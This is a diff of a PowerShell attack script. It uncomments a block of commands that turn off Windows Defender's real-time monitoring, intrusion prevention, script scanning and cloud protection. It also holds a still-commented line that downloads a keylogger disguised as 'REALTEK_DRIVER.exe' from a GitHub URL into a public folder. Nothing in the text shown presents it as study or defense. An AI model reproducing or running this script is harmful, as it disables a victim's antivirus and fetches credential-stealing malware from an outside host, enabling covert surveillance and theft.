@@ -1,5 +1,5 @@
 #disable windows defender from cmd
-<# Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIntrusionPreventionSystem $true
 Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableScriptScanning $true
@@ -18,7 +18,7 @@ Set-MpPreference -DisableCloudBasedProtection $true
 Set-MpPreference -HighThreatDefaultAction Block
 Set-MpPreference -ModerateThreatDefaultAction Block
 Set-MpPreference -LowThreatDefaultAction Block
-Set-MpPreference -SevereThreatDefaultAction Block #>
+Set-MpPreference -SevereThreatDefaultAction Block
 
 #download keylogger
 <# Invoke-WebRequest https://github.com/Droid567492/sdbdfg/raw/main/Keylogger-main/dist/REALTEK_DRIVER.exe -OutFile "C:\Users\Public\Documents\REALTEK_DRIVER.exe"
